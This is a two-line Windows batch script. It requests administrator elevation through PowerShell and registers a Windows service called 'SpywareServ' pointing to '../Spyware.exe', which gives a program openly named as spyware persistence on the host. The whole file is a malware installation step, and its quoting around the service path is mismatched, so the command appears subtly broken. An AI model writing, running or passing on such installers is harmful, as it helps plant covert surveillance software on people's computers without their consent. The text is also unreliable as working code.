@echo off
powershell -Command "Start-Process cmd -ArgumentList '/c sc create SpywareServ binPath= \"../Spyware.exe"' -Verb runAs"